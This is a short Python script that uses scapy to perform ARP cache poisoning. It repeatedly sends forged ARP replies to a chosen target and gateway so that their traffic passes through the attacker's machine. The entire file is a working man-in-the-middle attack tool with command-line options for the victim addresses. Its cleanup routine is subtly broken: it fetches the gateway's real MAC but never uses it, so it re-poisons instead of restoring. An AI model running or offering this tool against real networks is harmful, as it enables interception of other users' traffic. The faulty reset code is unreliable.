import time
import optparse
import scapy.all as scapy

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list= scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ModemIp):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ModemIp)
    scapy.send(arp_response,verbose=False)
    # scapy.ls(scapy.ARP())

def reset_operation(target_ip,poisoned_ModemIp):
    target_mac = get_mac_address(target_ip)
    target_real_mac= get_mac_address(poisoned_ModemIp)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ModemIp)
    scapy.send(arp_response,verbose=False,count=1)

def get_user_input():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip")
    parse_object.add_option("-g", "--gateway",dest="poisoned_ModemIp")
    options= parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP ! ")
    if not options.poisoned_ModemIp:
        print("Enter poisoned_ModemIp IP ! ")
    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_poisoned_ModemIp = user_ips.poisoned_ModemIp

number=0

try:
    while True:
        arp_poisoning(user_target_ip,user_poisoned_ModemIp)
        arp_poisoning(user_poisoned_ModemIp,user_target_ip)
        number += 1  # counter for sent packages
        print("Sending Package, Package Number:"+ str(number))
        time.sleep(3) # every 3 seconds repeats not to do too quick.

except KeyboardInterrupt:
    print("\n Program Interrupted  -  Exit ")
    reset_operation(user_target_ip,user_poisoned_ModemIp)
    reset_operation(user_poisoned_ModemIp,user_target_ip)
